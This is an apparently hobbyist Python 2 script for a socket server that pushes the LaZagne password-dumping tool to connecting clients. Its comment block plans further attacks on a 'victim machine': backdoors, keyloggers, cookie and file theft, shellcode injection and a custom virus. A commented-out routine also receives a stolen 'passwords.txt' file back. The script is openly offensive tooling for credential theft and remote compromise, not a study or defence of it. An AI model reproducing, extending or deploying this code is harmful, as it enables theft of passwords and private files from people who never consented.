

# WARNING: complete this project on windows!

'''
think about all hacking ways(jab on who; see details in above msg header & use Dr0p1t framework fot all kind of backdoors; compare socket programming with msf post exploitation modules) 
think about more tips and tricks to hack using socket programming like keylogger, 
steal cookies & other files from victim machine, 
steal deleted files using a recovery app[with socket programming we can do almost anything and build smt like msf to do all these more convenient], 
upload Malware, backdoors & virus codes shellcodes on there, 
inject shellcode(send the shellcode to inject it using ctypes lib; 
see the payload.py for more details to send the payload.py using socket programming)[in all these ways u need 3 files 1) server.py 2) client.py 3) virus.exe 
which u built this virus using assembly and shellcode programming]
'''

# SOURCES & TODO:
# make it multithread tcp using this link => http://www.bogotobogo.com/python/python_network_programming_server_client_file_transfer.php
# https://blenderartists.org/t/sending-binary-file-through-sockets-python-3-not-2-x/596392/10

#--------------------------------------------------
'''recvING the pswd file from client
	with open("passwords.txt", "wb") as f1:
		while True:
			data = conn.recv(1024)
			print 'Recv => ', len(data), '\n'
			if not data:
			   break
			f1.write(data)
	f1.close()
	close the server'''
#--------------------------------------------------


import socket, platform 

host = '127.0.0.1'
port = 8234

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind((host, port))
serversocket.listen(5)
print '[+] Server Listening On Port', port

def cycle():
	global serversocket
	try:
		while True:
			conn, addr = serversocket.accept()
			print '[+] Connected by: ', addr

			if platform.architecture()[0] == '64bit':
				filename = "laZagne_x64.exe"
				f = open(filename, 'rb')
				l = f.read(1024)
				while (l):
				   conn.send(l)
				   print 'Sent => ', len(l), '\n'
				   l = f.read(1024)
				f.close()
				print '[+] Done sending!'
			else: # x86 architecture
				filename = "laZagne_x86.exe"
				f = open(filename, 'rb')
				l = f.read(1024)
				while (l):
				   conn.send(l)
				   print 'Sent => ', len(l), '\n'
				   l = f.read(1024)
				f.close()
				print '[+] Done sending!'
			
			conn.shutdown(socket.SHUT_WR)
			conn.close()
	except:
		cycle()

cycle()



